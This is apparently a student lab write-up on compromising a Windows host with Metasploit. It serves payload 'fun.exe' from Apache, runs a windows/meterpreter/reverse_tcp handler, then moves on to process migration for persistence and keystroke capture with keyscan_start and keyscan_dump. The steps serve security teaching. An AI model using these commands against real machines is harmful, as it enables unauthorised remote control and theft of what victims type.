Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

![eth6 1](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/f985fbb4-b2d0-4d38-8d94-b7f31e7c7ffa)

copy the fun.exe into the apache /var/www/html folder:

![eth6 2](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/119094c1-f105-4415-8708-6e41bc65a0f1)

Start apache server sudo systemctl apache2 start and Check the status of apache2:

![eth6 3](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/286bbced-b8e3-4d8a-b773-27eac9f5729d)

![eth6 4](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/edf201ba-66ea-4bad-9917-d325e9df7c98)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![eth6 5](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/45e34589-d0a2-45e6-b421-ebab9f657426)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![eth6 6](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/7cf91c70-f3ea-4997-9cf1-3505c7144dcb)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit :

![eth6 7](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/9e992e77-934d-43e3-acb6-538f51ffe8f4)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![eth6 8](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/77729161-c414-41d1-9ebf-335729b2eb0f)

keyscan_dump Shows the keystrokes captured so far

![eth6 9](https://github.com/Gayathriraj18/Compromising-windows-using-Metasploit/assets/94154854/204a7d6a-9ce2-4ef9-a061-8f14525197a5)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
